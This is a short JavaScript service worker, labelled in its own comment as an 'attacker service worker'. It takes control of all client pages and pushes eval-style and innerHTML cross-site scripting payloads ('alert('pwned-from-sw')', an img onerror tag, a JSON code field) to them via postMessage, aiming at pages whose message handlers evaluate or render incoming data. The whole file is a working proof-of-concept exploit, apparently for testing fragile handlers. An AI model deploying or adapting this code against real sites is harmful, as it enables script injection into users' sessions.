// sw.js — attacker service worker
self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));

function sendAlertPayload(){
  self.clients.matchAll().then(clients => {
    clients.forEach(c => {
      // plain string payload that will be forwarded by the iframe relay
      // If the parent does `eval(e.data)` or `alert(e.data)`, this will trigger.
      c.postMessage("alert('pwned-from-sw')");
      // also send a few variants to catch different fragile handlers:
      c.postMessage("document.body.innerHTML = '<img src=x onerror=alert(1)>'");
      c.postMessage(JSON.stringify({cmd:'run', code:"alert('pwned-code-field')"}));
    });
  });
}

// send once shortly after activation
setTimeout(sendAlertPayload, 300);

// respond to page pings if present
self.addEventListener('message', ev => {
  if(ev.data && ev.data.cmd === 'ping') sendAlertPayload();
});
